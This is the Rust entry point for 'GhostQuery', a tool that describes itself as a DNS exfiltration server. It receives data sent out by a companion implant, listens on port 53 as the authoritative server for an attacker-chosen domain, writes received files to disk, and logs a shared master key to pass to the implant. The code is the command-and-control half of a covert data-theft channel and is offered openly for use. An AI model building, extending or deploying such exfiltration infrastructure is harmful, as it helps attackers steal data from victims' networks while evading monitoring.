//! GhostQuery Controller Binary
//!
//! The master node (reader) that receives exfiltrated data.

use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::Arc;

use clap::Parser;
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};

use ghost_query::controller::{ControllerConfig, ControllerServer};

#[derive(Parser, Debug)]
#[command(name = "gq-controller")]
#[command(about = "GhostQuery Controller - DNS Exfiltration Server")]
#[command(version)]
struct Args {
    /// Bind address for DNS server
    #[arg(short, long, default_value = "0.0.0.0:53")]
    bind: String,

    /// Domain this server is authoritative for
    #[arg(short, long, default_value = "ghost.local")]
    domain: String,

    /// Output directory for received files
    #[arg(short, long)]
    output: Option<PathBuf>,

    /// Master key (hex encoded, 64 chars = 32 bytes)
    #[arg(short, long)]
    key: Option<String>,

    /// Verbose output
    #[arg(short, long)]
    verbose: bool,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args = Args::parse();

    // Initialize logging
    let filter = if args.verbose { "debug" } else { "info" };
    tracing_subscriber::registry()
        .with(tracing_subscriber::fmt::layer())
        .with(tracing_subscriber::EnvFilter::new(filter))
        .init();

    tracing::info!("GhostQuery Controller starting...");

    // Parse bind address
    let bind_addr: SocketAddr = args.bind.parse()?;

    // Parse master key
    let master_key = if let Some(key_hex) = args.key {
        let bytes = hex::decode(&key_hex)?;
        if bytes.len() != 32 {
            anyhow::bail!("Master key must be 32 bytes (64 hex characters)");
        }
        let mut key = [0u8; 32];
        key.copy_from_slice(&bytes);
        key
    } else {
        // Generate random key
        let mut key = [0u8; 32];
        use rand::Rng;
        rand::thread_rng().fill(&mut key);
        tracing::warn!("Generated random master key: {}", hex::encode(key));
        tracing::warn!("Share this key with the implant!");
        key
    };

    // Create output directory if specified
    if let Some(ref output_dir) = args.output {
        std::fs::create_dir_all(output_dir)?;
        tracing::info!("Output directory: {:?}", output_dir);
    }

    // Create config
    let config = ControllerConfig {
        bind_addr,
        domain: args.domain.clone(),
        master_key,
        output_dir: args.output,
    };

    // Create and start server
    let server = Arc::new(ControllerServer::new(config));

    tracing::info!("Listening on {}", bind_addr);
    tracing::info!("Authoritative for domain: {}", args.domain);

    // Set up Ctrl+C handler
    let server_clone = Arc::clone(&server);
    tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        tracing::info!("Shutting down...");
        server_clone.stop();
    });

    // Start server
    server.start().await?;

    Ok(())
}

